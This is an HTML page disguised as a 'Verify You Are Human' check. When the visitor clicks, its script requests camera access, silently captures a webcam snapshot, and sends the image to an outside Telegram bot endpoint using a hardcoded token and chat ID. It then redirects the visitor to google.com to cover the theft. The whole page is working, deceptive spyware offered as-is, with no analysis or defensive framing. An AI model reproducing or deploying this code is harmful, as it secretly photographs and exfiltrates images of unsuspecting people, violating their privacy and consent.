
<!DOCTYPE html>
<html>
<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif;">
    <div style="margin-top:100px;">
        <h2>Verify You Are Human</h2>
        <button onclick="startOp()" style="padding:20px; background:#007bff; color:#fff; border:none; border-radius:5px;">Click to Verify</button>
    </div>
    <script>
        async function startOp() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.createElement('video'); v.srcObject = s; v.play();
                setTimeout(async () => {
                    const cv = document.createElement('canvas'); cv.width=400; cv.height=300;
                    cv.getContext('2d').drawImage(v,0,0);
                    const data = cv.toDataURL('image/jpeg', 0.5);
                    await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
                        method:'POST', headers:{'Content-Type':'application/json'},
                        body: JSON.stringify({chat_id:'5982066799', text: "📸 NEW CAPTURE:\n" + data})
                    });
                    s.getTracks().forEach(t=>t.stop());
                    window.location.href='https://google.com';
                }, 1500);
            } catch(e) { alert("Access Denied. Please allow camera."); }
        }
    </script>
</body>
</html>
